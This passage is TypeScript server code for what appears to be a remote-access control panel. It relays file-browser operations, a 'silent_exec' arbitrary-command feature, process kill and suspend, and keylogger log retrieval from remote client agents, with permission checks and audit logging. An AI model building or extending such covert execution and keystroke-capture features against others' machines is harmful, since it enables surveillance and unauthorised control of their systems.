import type { ServerWebSocket } from "bun";
import { v4 as uuidv4 } from "uuid";
import { AuditAction, logAudit } from "../auditLog";
import * as clientManager from "../clientManager";
import { logger } from "../logger";
import { metrics } from "../metrics";
import { versionCommandForClient } from "../command-compatibility";
import { encodeMessage } from "../protocol";
import { getSessionByTokenHash } from "../db";
import * as sessionManager from "../sessions/sessionManager";
import type { SocketData } from "../sessions/types";
import { normalizeFileUploadPayload } from "../fileTransfers";
import { canUserAccessClient, canUserAccessFeature, getUserById } from "../users";
import { hasPermission } from "../rbac";
import { decodeViewerPayload, safeSendViewer } from "./ws-viewer-utils";
import {
  consumeFileBrowserCommandRateLimit,
  FILE_BROWSER_MAX_ICON_ITEMS,
  FILE_BROWSER_MAX_READ_BYTES,
  FILE_BROWSER_MAX_THUMB_ITEMS,
  isSafeFileBrowserPath,
  validateFileBrowserCommandPayload,
} from "./file-browser-security";

function boundedBytes(value: unknown, maxBytes: number): Uint8Array | null {
  let bytes: Uint8Array;
  if (value instanceof Uint8Array) bytes = value;
  else if (value instanceof ArrayBuffer) bytes = new Uint8Array(value);
  else if (ArrayBuffer.isView(value)) bytes = new Uint8Array(value.buffer, value.byteOffset, value.byteLength);
  else return null;
  return bytes.byteLength <= maxBytes ? bytes : null;
}

export const MAX_FILE_LIST_ENTRIES = 100_000;
export const MAX_PROCESS_LIST_ENTRIES = 100_000;
export const MAX_PROCESS_ICON_ITEMS = 32;
export const MAX_PROCESS_ICON_BYTES = 256 * 1024;
export const MAX_KEYLOG_FILE_ITEMS = 1_000;
export const MAX_KEYLOG_CONTENT_BYTES = 64 * 1024 * 1024;

function boundedText(value: unknown, maxLength: number): string {
  if (typeof value !== "string") return "";
  return value.slice(0, maxLength).replace(/[\x00-\x1F\x7F]/g, "");
}

function boundedUtf8Text(value: unknown, maxBytes: number): string | null {
  if (typeof value !== "string") return null;
  if (value.length > maxBytes || Buffer.byteLength(value, "utf8") > maxBytes) return null;
  return value;
}

function boundedNumber(value: unknown, min = 0, max = Number.MAX_SAFE_INTEGER): number {
  const parsed = typeof value === "bigint" ? Number(value) : Number(value);
  if (!Number.isFinite(parsed)) return min;
  return Math.min(max, Math.max(min, parsed));
}

function relayCommandId(value: unknown): string | undefined {
  const commandId = boundedText(value, 128);
  return commandId || undefined;
}

function relayPath(value: unknown, allowEmpty = true): string {
  return isSafeFileBrowserPath(value, allowEmpty) ? value : "";
}

function baseAgentResult(type: string, payload: any): Record<string, unknown> {
  const commandId = relayCommandId(payload?.commandId);
  const pathValue = relayPath(payload?.path);
  const error = boundedText(payload?.error, 2_048);
  return {
    type,
    ...(commandId ? { commandId } : {}),
    ...(pathValue ? { path: pathValue } : {}),
    ...(error ? { error } : {}),
  };
}

export function normalizeFileBrowserAgentMessage(payload: any): Record<string, unknown> | null {
  const type = typeof payload?.type === "string" ? payload.type : "";
  if (!type) return null;
  const base = baseAgentResult(type, payload);

  switch (type) {
    case "file_list_result": {
      const entries = Array.isArray(payload.entries)
        ? payload.entries.slice(0, MAX_FILE_LIST_ENTRIES).flatMap((entry: any) => {
            if (!entry || !isSafeFileBrowserPath(entry.path)) return [];
            const name = boundedText(entry.name, 512);
            if (!name) return [];
            return [{
              name,
              path: entry.path,
              isDir: entry.isDir === true,
              size: boundedNumber(entry.size),
              modTime: boundedNumber(entry.modTime),
              mode: boundedText(entry.mode, 64),
              owner: boundedText(entry.owner, 128),
              group: boundedText(entry.group, 128),
              attrs: Math.floor(boundedNumber(entry.attrs, 0, 0xffff_ffff)),
              freeBytes: boundedNumber(entry.freeBytes),
              totalBytes: boundedNumber(entry.totalBytes),
              fsType: boundedText(entry.fsType, 64),
            }];
          })
        : [];
      return {
        ...base,
        path: relayPath(payload.path),
        entries,
        accessDenied: payload.accessDenied === true,
        canRequestAccess: payload.canRequestAccess === true,
        accessHelp: boundedText(payload.accessHelp, 1_024),
      };
    }
    case "file_download": {
      const data = boundedBytes(payload.data, 4 * 1024 * 1024);
      if (payload.data && !data) {
        return { ...base, error: "Download chunk exceeded limit" };
      }
      return {
        ...base,
        ...(data ? { data } : {}),
        offset: boundedNumber(payload.offset),
        total: boundedNumber(payload.total),
        chunkIndex: Math.floor(boundedNumber(payload.chunkIndex, 0, 1_000_000)),
        chunksTotal: Math.floor(boundedNumber(payload.chunksTotal, 0, 1_000_000)),
      };
    }
    case "file_upload_result":
      return {
        ...base,
        transferId: boundedText(payload.transferId, 128),
        ok: payload.ok === true,
        offset: boundedNumber(payload.offset),
        size: boundedNumber(payload.size),
        received: boundedNumber(payload.received),
        total: boundedNumber(payload.total),
      };
    case "file_read_result": {
      const content = boundedUtf8Text(payload.content, FILE_BROWSER_MAX_READ_BYTES);
      if (typeof payload.content === "string" && content === null) {
        return { ...base, error: "File content exceeded editor limit" };
      }
      return { ...base, content: content || "", isBinary: payload.isBinary === true };
    }
    case "file_search_result": {
      const results = Array.isArray(payload.results)
        ? payload.results.slice(0, 500).flatMap((result: any) => {
            if (!result || !isSafeFileBrowserPath(result.path)) return [];
            const line = Math.floor(boundedNumber(result.line, 0, 10_000_000));
            return [{
              path: result.path,
              ...(line > 0 ? { line } : {}),
              match: boundedText(result.match, 4_096),
            }];
          })
        : [];
      return {
        ...base,
        searchId: boundedText(payload.searchId, 128),
        results,
        complete: payload.complete === true,
      };
    }
    case "file_icon_result": {
      const icons = Array.isArray(payload.icons)
        ? payload.icons.slice(0, FILE_BROWSER_MAX_ICON_ITEMS).flatMap((item: any) => {
            const key = boundedText(item?.key, 4_224);
            if (!key) return [];
            const png = boundedBytes(item?.png, 512 * 1024);
            return [{ key, ...(png ? { png } : {}), error: boundedText(item?.error, 512) }];
          })
        : [];
      return { ...base, icons };
    }
    case "file_thumb_result": {
      const thumbs = Array.isArray(payload.thumbs)
        ? payload.thumbs.slice(0, FILE_BROWSER_MAX_THUMB_ITEMS).flatMap((item: any) => {
            const key = boundedText(item?.key, 4_224);
            if (!key) return [];
            const jpeg = boundedBytes(item?.jpeg, 1024 * 1024);
            return [{
              key,
              ...(jpeg ? { jpeg } : {}),
              w: Math.floor(boundedNumber(item?.w, 0, 512)),
              h: Math.floor(boundedNumber(item?.h, 0, 512)),
              error: boundedText(item?.error, 512),
            }];
          })
        : [];
      return { ...base, thumbs };
    }
    case "file_peek_result": {
      const data = boundedBytes(payload.data, 4_096);
      if (payload.data && !data) return { ...base, error: "Preview data exceeded limit" };
      return {
        ...base,
        ...(data ? { data } : {}),
        size: boundedNumber(payload.size),
        isText: payload.isText === true,
      };
    }
    case "file_dirsize_result":
      return {
        ...base,
        bytes: boundedNumber(payload.bytes),
        files: boundedNumber(payload.files),
        dirs: boundedNumber(payload.dirs),
        done: payload.done === true,
      };
    case "file_hash_result":
      return {
        ...base,
        algorithm: boundedText(payload.algorithm, 32),
        digest: boundedText(payload.digest, 512),
        size: boundedNumber(payload.size),
      };
    case "command_result":
    case "command_progress":
      return {
        ...base,
        ok: payload.ok === true,
        message: boundedText(payload.message, 4_096),
      };
    default:
      return null;
  }
}

export function normalizeProcessAgentMessage(payload: any): Record<string, unknown> | null {
  const type = typeof payload?.type === "string" ? payload.type : "";
  const commandId = relayCommandId(payload?.commandId);
  const base = { type, ...(commandId ? { commandId } : {}) };
  if (type === "process_list_result") {
    const processes = Array.isArray(payload.processes)
      ? payload.processes.slice(0, MAX_PROCESS_LIST_ENTRIES).flatMap((process: any) => {
          if (!process || typeof process !== "object") return [];
          return [{
            pid: Math.floor(boundedNumber(process.pid, 0, 0xffff_ffff)),
            ppid: Math.floor(boundedNumber(process.ppid, 0, 0xffff_ffff)),
            name: boundedText(process.name, 256),
            exePath: boundedText(process.exePath, 4_096),
            cpu: boundedNumber(process.cpu, 0, 100_000),
            memory: boundedNumber(process.memory),
            username: boundedText(process.username, 256),
            type: boundedText(process.type, 64),
            self: process.self === true,
          }];
        })
      : [];
    return { ...base, processes, error: boundedText(payload.error, 2_048) };
  }
  if (type === "process_icon_result") {
    const icons = Array.isArray(payload.icons)
      ? payload.icons.slice(0, MAX_PROCESS_ICON_ITEMS).flatMap((item: any) => {
          const key = boundedText(item?.key, 4_224);
          if (!key) return [];
          const png = boundedBytes(item?.png, MAX_PROCESS_ICON_BYTES);
          return [{ key, ...(png ? { png } : {}), error: boundedText(item?.error, 512) }];
        })
      : [];
    return { ...base, icons };
  }
  return null;
}

export function normalizeKeyloggerAgentMessage(payload: any): Record<string, unknown> | null {
  const type = typeof payload?.type === "string" ? payload.type : "";
  switch (type) {
    case "keylog_file_list": {
      const files = Array.isArray(payload.files)
        ? payload.files.slice(0, MAX_KEYLOG_FILE_ITEMS).flatMap((file: any) => {
            const name = boundedText(file?.name, 255);
            if (!name || name === "." || name === ".." || name.includes("/") || name.includes("\\")) return [];
            return [{
              name,
              size: boundedNumber(file?.size),
              date: boundedText(file?.date, 64),
            }];
          })
        : [];
      return { type, files };
    }
    case "keylog_file_content": {
      const filename = boundedText(payload.filename, 255);
      const content = boundedUtf8Text(payload.content, MAX_KEYLOG_CONTENT_BYTES);
      if (
        !filename
        || filename === "."
        || filename === ".."
        || filename.includes("/")
        || filename.includes("\\")
        || content === null
      ) return null;
      return { type, filename, content };
    }
    case "keylog_clear_result":
    case "keylog_delete_result":
    case "keylog_permission_result":
      return {
        type,
        ...(relayCommandId(payload.commandId) ? { commandId: relayCommandId(payload.commandId) } : {}),
        ok: payload.ok === true,
        filename: boundedText(payload.filename, 255),
        error: boundedText(payload.error, 2_048),
        message: boundedText(payload.message, 2_048),
        reason: boundedText(payload.reason, 128),
        granted: payload.granted === true,
      };
    default:
      return null;
  }
}

type FileBrowserViewer = {
  id: string;
  clientId: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
};

type ProcessViewer = {
  id: string;
  clientId: string;
  viewer: ServerWebSocket<SocketData>;
  createdAt: number;
};

type WsViewerClusterDeps = {
  pendingHttpDownloads: ReadonlyMap<string, { clientId?: string }>;
  consumeHttpDownloadPayload: (payload: any) => Promise<void> | void;
};

const WS_UPLOAD_MAX_TOTAL = 8 * 1024 * 1024;

const fileBrowserCommandSessions = new Map<string, {
  sessionId: string;
  timeout: ReturnType<typeof setTimeout>;
}>();

function trackFileBrowserCommand(commandId: string, sessionId: string): void {
  const existing = fileBrowserCommandSessions.get(commandId);
  if (existing) clearTimeout(existing.timeout);
  const timeout = setTimeout(() => fileBrowserCommandSessions.delete(commandId), 10 * 60 * 1000);
  fileBrowserCommandSessions.set(commandId, { sessionId, timeout });
}

function finishFileBrowserCommand(commandId: string): void {
  const entry = fileBrowserCommandSessions.get(commandId);
  if (!entry) return;
  clearTimeout(entry.timeout);
  fileBrowserCommandSessions.delete(commandId);
}

function viewerCommandId(value: unknown, fallback: string): string {
  return typeof value === "string" && value.length > 0 && value.length <= 128 ? value : fallback;
}

function denyFileBrowserViewer(ws: ServerWebSocket<SocketData>, reason: string): false {
  logger.warn(`[filebrowser] closing unauthorized viewer: ${reason}`);
  try { ws.close(1008, reason); } catch {}
  return false;
}

function hasLiveFileBrowserAccess(ws: ServerWebSocket<SocketData>): boolean {
  const { authTokenHash, clientId, userId } = ws.data;
  if (!authTokenHash || userId === undefined) return denyFileBrowserViewer(ws, "Authentication expired");
  const session = getSessionByTokenHash(authTokenHash);
  if (!session || session.userId !== userId || session.expiresAt <= Math.floor(Date.now() / 1000)) {
    return denyFileBrowserViewer(ws, "Session expired or revoked");
  }
  const user = getUserById(userId);
  if (!user || user.role === "viewer") return denyFileBrowserViewer(ws, "File browser access denied");
  if (!hasPermission(user.role, "clients:control", user.id)
      || !canUserAccessFeature(user.id, user.role, "file_browser")
      || !canUserAccessClient(user.id, user.role, clientId)) {
    return denyFileBrowserViewer(ws, "File browser access revoked");
  }
  ws.data.userRole = user.role;
  return true;
}

function rejectFileBrowserCommand(ws: ServerWebSocket<SocketData>, message: string): void {
  safeSendViewer(ws, { type: "command_error", error: message });
}

export function handleFileBrowserViewerOpen(ws: ServerWebSocket<SocketData>) {
  const { clientId, userId, userRole } = ws.data;
  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
    ws.close(1008, "Forbidden: client access denied");
    return;
  }
  const sessionId = uuidv4();
  const target = clientManager.getClient(clientId);
  const session: FileBrowserViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
  sessionManager.addFileBrowserSession(session);
  ws.data.sessionId = sessionId;
  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target, clientUser: target?.user || "", clientOs: target?.os || "" });
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
  }
}

export function handleFileBrowserViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
  const payload = decodeViewerPayload(raw);
  const expensive = payload?.commandType === "file_hash"
    || payload?.commandType === "file_thumb"
    || payload?.type === "file_download"
    || payload?.type === "file_zip";
  if (!consumeFileBrowserCommandRateLimit(ws, expensive)) {
    rejectFileBrowserCommand(ws, "File browser command rate limit exceeded");
    return;
  }
  if (!payload || typeof payload.type !== "string") return;
  if (!hasLiveFileBrowserAccess(ws)) return;
  const { clientId } = ws.data;
  logger.debug(`[DEBUG] File browser message from viewer for client ${clientId}:`, payload.type, payload.commandType || "");

  const target = clientManager.getClient(clientId);
  if (!target) {
    logger.debug(`[DEBUG] Client ${clientId} not found - sending offline status`);
    safeSendViewer(ws, { type: "status", status: "offline" });
    return;
  }

  const commandId = uuidv4();

  if (payload.type === "command") {
    if (typeof payload.commandType !== "string") return;
    logger.debug(`[DEBUG] Handling command type: ${payload.commandType}`);
    if (payload.commandType === "silent_exec") {
      const current = getUserById(ws.data.userId!);
      if (!current || !hasPermission(current.role, "clients:silent-exec", current.id)) {
        rejectFileBrowserCommand(ws, "Silent execution is not permitted");
        return;
      }
    }
    if (payload.commandType === "silent_exec") {
      const command = payload.payload?.command;
      if (typeof command !== "string" || command.length === 0 || command.length > 32_768 || /[\x00]/.test(command)) {
        rejectFileBrowserCommand(ws, "Invalid silent execution payload");
        return;
      }
    }
    const actualPayload = payload.commandType === "silent_exec"
      ? payload.payload
      : validateFileBrowserCommandPayload(payload.commandType, payload.payload || {});
    if (!actualPayload) {
      rejectFileBrowserCommand(ws, "Invalid file browser command payload");
      return;
    }
    const routedId = typeof payload.id === "string" && payload.id.length <= 128 ? payload.id : commandId;
    if (ws.data.sessionId) trackFileBrowserCommand(routedId, ws.data.sessionId);
    switch (payload.commandType) {
      case "file_read":
        logger.debug(`[DEBUG] Forwarding file_read to client ${clientId}:`, actualPayload.path);
        target.ws.send(encodeMessage({ type: "command", commandType: "file_read", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_read");
        break;
      case "file_write":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_write", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_write");
        break;
      case "file_request_access":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_request_access", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_request_access");
        break;
      case "file_search":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_search", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_search");
        break;
      case "file_copy":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_copy", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_copy");
        break;
      case "file_move":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_move", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_move");
        break;
      case "file_chmod":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_chmod", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_chmod");
        break;
      case "file_execute":
        logger.debug(`[DEBUG] Forwarding file_execute to client ${clientId}:`, actualPayload.path);
        target.ws.send(encodeMessage({ type: "command", commandType: "file_execute", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_execute");
        break;
      case "file_icon":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_icon", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_icon");
        break;
      case "file_thumb":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_thumb", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_thumb");
        break;
      case "file_dirsize":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_dirsize", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_dirsize");
        break;
      case "file_peek":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_peek", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_peek");
        break;
      case "file_hash":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_hash", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_hash");
        logAudit({
          timestamp: Date.now(),
          username: (ws.data as any).username || "unknown",
          ip: ws.data.ip || "unknown",
          action: AuditAction.FILE_DOWNLOAD,
          targetClientId: clientId,
          details: JSON.stringify({ path: actualPayload?.path || "", op: "hash", algorithm: actualPayload?.algorithm || "sha256" }),
          success: true,
        });
        break;
      case "silent_exec":
        logger.debug(`[DEBUG] Forwarding silent_exec to client ${clientId}:`, actualPayload.command);
        target.ws.send(encodeMessage({ type: "command", commandType: "silent_exec", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("silent_exec");
        break;
      case "file_upload_http":
        target.ws.send(encodeMessage({ type: "command", commandType: "file_upload_http", id: routedId, payload: actualPayload } as any));
        metrics.recordCommand("file_upload");
        logAudit({
          timestamp: Date.now(),
          username: (ws.data as any).username || "unknown",
          ip: ws.data.ip || "unknown",
          action: AuditAction.FILE_UPLOAD,
          targetClientId: clientId,
          details: JSON.stringify({ path: actualPayload.path || "", mode: "http_pull" }),
          success: true,
        });
        break;
      case "file_upload_desktop":
        try {
          target.ws.send(encodeMessage(versionCommandForClient(target, {
            type: "command",
            commandType: "file_upload_desktop",
            id: routedId,
            payload: actualPayload,
          } as any)));
        } catch (error) {
          finishFileBrowserCommand(routedId);
          safeSendViewer(ws, {
            type: "command_result",
            commandId: routedId,
            ok: false,
            message: error instanceof Error ? error.message : "Desktop upload is unsupported by this client",
          });
          break;
        }
        metrics.recordCommand("file_upload_desktop");
        logAudit({
          timestamp: Date.now(),
          username: (ws.data as any).username || "unknown",
          ip: ws.data.ip || "unknown",
          action: AuditAction.FILE_UPLOAD,
          targetClientId: clientId,
          details: JSON.stringify({ fileName: actualPayload.fileName || "", destination: "remote_pointer", display: actualPayload.display, x: actualPayload.x, y: actualPayload.y, mode: "http_pull" }),
          success: true,
        });
        break;
      default:
        break;
    }
    return;
  }

  switch (payload.type) {
    case "file_list":
      if (!isSafeFileBrowserPath(payload.path, true)) return rejectFileBrowserCommand(ws, "Invalid path");
      if (ws.data.sessionId) trackFileBrowserCommand(commandId, ws.data.sessionId);
      target.ws.send(encodeMessage({ type: "command", commandType: "file_list", id: commandId, payload: { path: payload.path || "" } } as any));
      metrics.recordCommand("file_list");
      logAudit({
        timestamp: Date.now(),
        username: (ws.data as any).username || "unknown",
        ip: ws.data.ip || "unknown",
        action: AuditAction.FILE_LIST,
        targetClientId: clientId,
        details: JSON.stringify({ path: payload.path || "" }),
        success: true,
      });
      break;
    case "file_download":
      if (!isSafeFileBrowserPath(payload.path)) return rejectFileBrowserCommand(ws, "Invalid path");
      if (ws.data.sessionId) trackFileBrowserCommand(commandId, ws.data.sessionId);
      target.ws.send(encodeMessage({ type: "command", commandType: "file_download", id: commandId, payload: { path: payload.path || "" } } as any));
      metrics.recordCommand("file_download");
      logAudit({
        timestamp: Date.now(),
        username: (ws.data as any).username || "unknown",
        ip: ws.data.ip || "unknown",
        action: AuditAction.FILE_DOWNLOAD,
        targetClientId: clientId,
        details: JSON.stringify({ path: payload.path || "" }),
        success: true,
      });
      break;
    case "file_upload": {
      const upload = normalizeFileUploadPayload(payload);
      if (!upload) return;
      if (!isSafeFileBrowserPath(upload.path)) {
        rejectFileBrowserCommand(ws, "Invalid upload path");
        return;
      }
      if (upload.total > WS_UPLOAD_MAX_TOTAL) {
        safeSendViewer(ws, {
          type: "file_upload_result",
          commandId,
          transferId: upload.transferId,
          path: upload.path,
          ok: false,
          error: `file too large for ws upload (${upload.total} > ${WS_UPLOAD_MAX_TOTAL}); use http upload`,
        });
        break;
      }
      const uploadCommandId = viewerCommandId(payload.commandId, commandId);
      if (ws.data.sessionId) trackFileBrowserCommand(uploadCommandId, ws.data.sessionId);
      target.ws.send(encodeMessage({
        type: "command",
        commandType: "file_upload",
        id: uploadCommandId,
        payload: {
          path: upload.path,
          data: upload.data,
          offset: upload.offset,
          total: upload.total,
          transferId: upload.transferId,
        },
      } as any));
      metrics.recordCommand("file_upload");
      if (upload.offset === 0) {
        logAudit({
          timestamp: Date.now(),
          username: (ws.data as any).username || "unknown",
          ip: ws.data.ip || "unknown",
          action: AuditAction.FILE_UPLOAD,
          targetClientId: clientId,
          details: JSON.stringify({ path: upload.path, total: upload.total, mode: "ws_chunked" }),
          success: true,
        });
      }
      break;
    }
    case "file_delete": {
      if (!isSafeFileBrowserPath(payload.path)) return rejectFileBrowserCommand(ws, "Invalid path");
      const deleteCommandId = viewerCommandId(payload.commandId, commandId);
      if (ws.data.sessionId) trackFileBrowserCommand(deleteCommandId, ws.data.sessionId);
      target.ws.send(encodeMessage({ type: "command", commandType: "file_delete", id: deleteCommandId, payload: { path: payload.path || "" } } as any));
      metrics.recordCommand("file_delete");
      logAudit({
        timestamp: Date.now(),
        username: (ws.data as any).username || "unknown",
        ip: ws.data.ip || "unknown",
        action: AuditAction.FILE_DELETE,
        targetClientId: clientId,
        details: JSON.stringify({ path: payload.path || "" }),
        success: true,
      });
      break;
    }
    case "file_mkdir": {
      if (!isSafeFileBrowserPath(payload.path)) return rejectFileBrowserCommand(ws, "Invalid path");
      const mkdirCommandId = viewerCommandId(payload.commandId, commandId);
      if (ws.data.sessionId) trackFileBrowserCommand(mkdirCommandId, ws.data.sessionId);
      target.ws.send(encodeMessage({ type: "command", commandType: "file_mkdir", id: mkdirCommandId, payload: { path: payload.path || "" } } as any));
      metrics.recordCommand("file_mkdir");
      logAudit({
        timestamp: Date.now(),
        username: (ws.data as any).username || "unknown",
        ip: ws.data.ip || "unknown",
        action: AuditAction.FILE_MKDIR,
        targetClientId: clientId,
        details: JSON.stringify({ path: payload.path || "" }),
        success: true,
      });
      break;
    }
    case "file_zip": {
      if (!isSafeFileBrowserPath(payload.path)) return rejectFileBrowserCommand(ws, "Invalid path");
      const zipCommandId = viewerCommandId(payload.commandId, commandId);
      if (ws.data.sessionId) trackFileBrowserCommand(zipCommandId, ws.data.sessionId);
      target.ws.send(encodeMessage({ type: "command", commandType: "file_zip", id: zipCommandId, payload: { path: payload.path || "" } } as any));
      metrics.recordCommand("file_zip");
      logAudit({
        timestamp: Date.now(),
        username: (ws.data as any).username || "unknown",
        ip: ws.data.ip || "unknown",
        action: AuditAction.FILE_ZIP,
        targetClientId: clientId,
        details: JSON.stringify({ path: payload.path || "" }),
        success: true,
      });
      break;
    }
    case "command_abort":
      if (typeof payload.commandId === "string" && payload.commandId.length <= 128) {
        target.ws.send(encodeMessage({ type: "command_abort", commandId: payload.commandId } as any));
      }
      break;
    default:
      break;
  }
}

export function handleFileBrowserMessage(clientId: string, payload: any, deps: WsViewerClusterDeps) {
  const type = payload?.type as string | undefined;
  const payloadCommandId = typeof payload?.commandId === "string" ? payload.commandId : undefined;
  const pendingDownload = payloadCommandId
    ? deps.pendingHttpDownloads.get(payloadCommandId)
    : undefined;
  const isHttpDownload =
    type === "file_download" &&
    pendingDownload?.clientId === clientId;

  if (isHttpDownload) {
    void deps.consumeHttpDownloadPayload(payload);
  }

  const commandOwner = payloadCommandId ? fileBrowserCommandSessions.get(payloadCommandId) : undefined;
  if (type === "file_download" && !isHttpDownload && !commandOwner) {
    logger.debug(`[filebrowser] dropped unsolicited download payload client=${clientId}`);
    return;
  }
  const ownerSessionId = commandOwner?.sessionId;
  const relayPayload = isHttpDownload ? null : normalizeFileBrowserAgentMessage(payload);
  if (!isHttpDownload && !relayPayload) return;

  let hasSession = false;
  for (const session of sessionManager.getFileBrowserSessionsByClient(clientId)) {
    if (!hasSession) {
      hasSession = true;
      if (type && type !== "command_result" && type !== "command_progress") {
        logger.debug(`[filebrowser] client=${clientId} type=${type}`);
      }
    }
    if (isHttpDownload) {
      continue;
    }
    if (ownerSessionId && session.id !== ownerSessionId) {
      continue;
    }
    safeSendViewer(session.viewer, relayPayload, "filebrowser");
  }
  if (payloadCommandId) {
    const isTerminalDownload = type === "file_download" && (
      !!payload?.error
      || (Number.isFinite(Number(payload?.chunksTotal))
        && Number.isFinite(Number(payload?.chunkIndex))
        && Number(payload.chunkIndex) + 1 >= Number(payload.chunksTotal))
    );
    if (type === "command_result" || type?.endsWith("_result") || isTerminalDownload) {
      finishFileBrowserCommand(payloadCommandId);
    }
  }
}

export function handleProcessViewerOpen(ws: ServerWebSocket<SocketData>) {
  const { clientId, userId, userRole } = ws.data;
  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
    ws.close(1008, "Forbidden: client access denied");
    return;
  }
  const sessionId = uuidv4();
  const target = clientManager.getClient(clientId);
  const session: ProcessViewer = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
  sessionManager.addProcessSession(session);
  ws.data.sessionId = sessionId;
  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target });
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
  }
}

export function handleProcessViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
  const payload = decodeViewerPayload(raw);
  if (!payload || typeof payload.type !== "string") return;
  const { clientId } = ws.data;
  const target = clientManager.getClient(clientId);
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline" });
    return;
  }

  const commandId = uuidv4();
  switch (payload.type) {
    case "process_list":
      target.ws.send(encodeMessage({ type: "command", commandType: "process_list", id: commandId } as any));
      metrics.recordCommand("process_list");
      break;
    case "process_icon":
      target.ws.send(encodeMessage({ type: "command", commandType: "process_icon", id: commandId, payload: { items: payload.items || [] } } as any));
      metrics.recordCommand("process_icon");
      break;
    case "process_kill": {
      const pid = Number(payload.pid);
      if (!Number.isFinite(pid) || pid <= 0) {
        safeSendViewer(ws, { type: "command_result", commandId, ok: false, message: "Invalid PID" });
        break;
      }
      target.ws.send(encodeMessage({ type: "command", commandType: "process_kill", id: commandId, payload: { pid } } as any));
      metrics.recordCommand("process_kill");
      break;
    }
    case "process_suspend": {
      const pid = Number(payload.pid);
      if (!Number.isFinite(pid) || pid <= 0) {
        safeSendViewer(ws, { type: "command_result", commandId, ok: false, message: "Invalid PID" });
        break;
      }
      target.ws.send(encodeMessage({ type: "command", commandType: "process_suspend", id: commandId, payload: { pid } } as any));
      metrics.recordCommand("process_suspend");
      break;
    }
    case "process_resume": {
      const pid = Number(payload.pid);
      if (!Number.isFinite(pid) || pid <= 0) {
        safeSendViewer(ws, { type: "command_result", commandId, ok: false, message: "Invalid PID" });
        break;
      }
      target.ws.send(encodeMessage({ type: "command", commandType: "process_resume", id: commandId, payload: { pid } } as any));
      metrics.recordCommand("process_resume");
      break;
    }
    default:
      break;
  }
}

export function handleProcessMessage(clientId: string, payload: any) {
  const relayPayload = normalizeProcessAgentMessage(payload);
  if (!relayPayload) return;
  for (const session of sessionManager.getProcessSessionsByClient(clientId)) {
    safeSendViewer(session.viewer, relayPayload, "processes");
  }
}

export function handleKeyloggerViewerOpen(ws: ServerWebSocket<SocketData>) {
  const { clientId, userId, userRole } = ws.data;
  if (userId !== undefined && userRole && !canUserAccessClient(userId, userRole as any, clientId)) {
    ws.close(1008, "Forbidden: client access denied");
    return;
  }
  const sessionId = uuidv4();
  const target = clientManager.getClient(clientId);
  const session = { id: sessionId, clientId, viewer: ws, createdAt: Date.now() };
  sessionManager.addKeyloggerSession(session);
  ws.data.sessionId = sessionId;
  logger.info(`[keylogger] viewer connected session=${sessionId} client=${clientId}`);
  safeSendViewer(ws, { type: "ready", sessionId, clientId, clientOnline: !!target, clientOs: target?.os || "" });
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline", reason: "Client is offline", sessionId });
  }
}

export function handleKeyloggerViewerMessage(ws: ServerWebSocket<SocketData>, raw: string | ArrayBuffer | Uint8Array) {
  const payload = decodeViewerPayload(raw);
  if (!payload || typeof payload.type !== "string") return;
  const { clientId } = ws.data;
  const target = clientManager.getClient(clientId);
  if (!target) {
    safeSendViewer(ws, { type: "status", status: "offline" });
    return;
  }

  const commandId = uuidv4();
  switch (payload.type) {
    case "keylog_request_permission":
      // Ask the agent to trigger the macOS accessibility permission prompt.
      // On non-macOS agents this is a no-op that immediately returns granted.
      target.ws.send(encodeMessage({ type: "command", commandType: "keylog_request_permission", id: commandId } as any));
      metrics.recordCommand("keylog_request_permission");
      break;
    case "keylog_list":
      target.ws.send(encodeMessage({ type: "command", commandType: "keylog_list", id: commandId } as any));
      metrics.recordCommand("keylog_list");
      break;
    case "keylog_retrieve": {
      const filename = typeof payload.filename === "string" ? payload.filename : "";
      if (!filename) {
        safeSendViewer(ws, { type: "command_result", commandId, ok: false, message: "Invalid filename" });
        break;
      }
      target.ws.send(encodeMessage({ type: "command", commandType: "keylog_retrieve", id: commandId, payload: { filename } } as any));
      metrics.recordCommand("keylog_retrieve");
      break;
    }
    case "keylog_clear_all":
      target.ws.send(encodeMessage({ type: "command", commandType: "keylog_clear_all", id: commandId } as any));
      metrics.recordCommand("keylog_clear_all");
      break;
    case "keylog_delete": {
      const filename = typeof payload.filename === "string" ? payload.filename : "";
      if (!filename) {
        safeSendViewer(ws, { type: "command_result", commandId, ok: false, message: "Invalid filename" });
        break;
      }
